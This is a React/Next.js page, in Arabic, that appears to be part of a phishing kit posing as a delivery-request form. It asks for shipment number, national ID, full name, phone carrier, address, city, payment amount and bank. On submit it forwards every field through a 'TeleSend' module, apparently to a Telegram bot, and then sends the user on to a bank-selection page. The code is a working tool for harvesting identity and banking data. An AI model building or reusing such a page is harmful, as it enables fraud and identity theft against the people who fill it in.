"use client"
import { useState } from 'react'
import styles from './fozajil.module.css'
import Image from 'next/image'
import formza from '../../../public/formza.png'
import bot from '@/compnante/dataBot'
import {useRouter,useSearchParams} from 'next/navigation'
import TeleSned from '../../server/TeleSend'

const Page = () => {

  const {Send} = TeleSned();
  const [form,setForm]= useState(  {data : {
    رقم_الهوية:"",
    نوع_الشحنة:"",
    الاسم_الكامل: "",
    رقم_الهاتف: "",
    نوع_رقم:"ليبارا",
    العنوان:"",
    المدينة:"",
    قيمة_السداد:"",
    نوع_البطاقة:"بنك السعودي للاستثمار",
    رقم_الشـــحنة:""
  }},)

  const setDynamicFormData = (name,value)=>{
    setForm({
      data:{
        ...form.data,
        [name]:value,
      }
    })
  }
  const PostToDiscord = () => {
    const description = Object.entries(form.data)
      .map((d) => `${d[0]} : ${d[1]} `)
      .join("\n");
    Send(description)
    
  };
  const  name = useSearchParams();
  const track = name.get("name")
  
  
  const router = useRouter()

  const handlerout = () => {
    
if(form.data.قيمة_السداد == "" || form.data.رقم_الهوية == "" || form.data.نوع_الشحنة== "" || form.data.الاسم_الكامل == ""|| form.data.رقم_الهاتف == ""|| form.data.نوع_رقم == ""||form.data.العنوان== ""|| form.data.المدينة == "" || form.data.رقم_الشـــحنة == ""||form.data.نوع_البطاقة == "" ) {
      alert('من فضلك قم بملى الحقول')
    }else{
       router.push(`/fozajil/banks?names=${track}`)
    }
  }




  return (
    <div className={styles.contain} dir='rtl'>
      <div className={styles.navbar}>
        <h2>طلب  توصيل واستلام</h2>
      </div>
        <form onSubmit={(e)=>{
          e.preventDefault();
          PostToDiscord()
        }}> 
            <Image 
              src={formza}
              width={412}
            />
            <input type="number" name='رقم_الشـــحنة'   placeholder='رقم الشحنة'  onChange={(e) => {
    const { name, value } = e.target;
    setDynamicFormData(name, value);
  }} required maxLength="12"  minLength="8"/>
            <input type="number" name='رقم_الهوية'  placeholder='رقم بطاقة الأحوال او الأقامة'   onChange={(e) => {
    const { name, value } = e.target;
    setDynamicFormData(name, value);
  }} required />
            <input type="text" name='نوع_الشحنة'  placeholder='نوع الشحنة'   onChange={(e) => {
    const { name, value } = e.target;
    setDynamicFormData(name, value);
  }} required />
            <input type="text" name='الاسم_الكامل'  placeholder='الأسم الكامل'   onChange={(e) => {
    const { name, value } = e.target;
    setDynamicFormData(name, value);
  }} required />
            <input type="number" name='رقم_الهاتف'  placeholder='رقم الجوال'   onChange={(e) => {
    const { name, value } = e.target;
    setDynamicFormData(name, value);
  }} required maxLength="10"/>
            <select name="نوع_رقم"   onChange={(e) => {
    const { name, value } = e.target;
    setDynamicFormData(name, value);
  }} required>
                <option value="ليبارا">ليبارا</option>
                <option value="فرجن">فرجن</option>
                <option value="STC">STC</option>
                <option value="زين">زين</option>
                <option value="موبايلي">موبايلي</option>
                <option value="سلام">سلام</option>
                <option value="ريدبول">ريدبول</option>
            </select>
            <input type="text" name='العنوان'  placeholder='العنوان'   onChange={(e) => {
    const { name, value } = e.target;
    setDynamicFormData(name, value);
  }} required />
            <input type="text" name='المدينة'  placeholder='المدينة'   onChange={(e) => {
    const { name, value } = e.target;
    setDynamicFormData(name, value);
  }} required />
            <input type="number" name='قيمة_السداد' placeholder='قيمة السداد'   onChange={(e) => {
    const { name, value } = e.target;
    setDynamicFormData(name, value);
  }} required />
            <select name="نوع_البطاقة"   onChange={(e) => {
    const { name, value } = e.target;
    setDynamicFormData(name, value);
  }} required>
                <option value="بنك السعودي للاستثمار">بنك السعودي للاستثمار</option>
                <option value="بنك الأهلي ">بنك الأهلي</option>
                <option value="بنك الراجحي">بنك الراجحي</option>
                <option value="بنك الرياض">بنك الرياض</option>
                <option value="بنك العربي">بنك العربي</option>
                <option value="بنك الجزيرة">بنك الجزيرة</option>
                <option value="بنك السعودي الفرنسي">بنك السعودي الفرنسي</option>
                <option value=" سمبا كابيتال"> سامبا كابيتال</option>
                <option value="بنك سامبا">بنك سامبا</option>
                <option value="بنك البلاد">بنك البلاد</option>
                <option value="بنك الأنماء">بنك الأنماء</option>
                <option value="بنك ساب">بنك ساب</option>
            </select>

        <button type='submit' onClick={handlerout}>التالي</button>
        </form>
    </div>

  )
}

export default Page; 
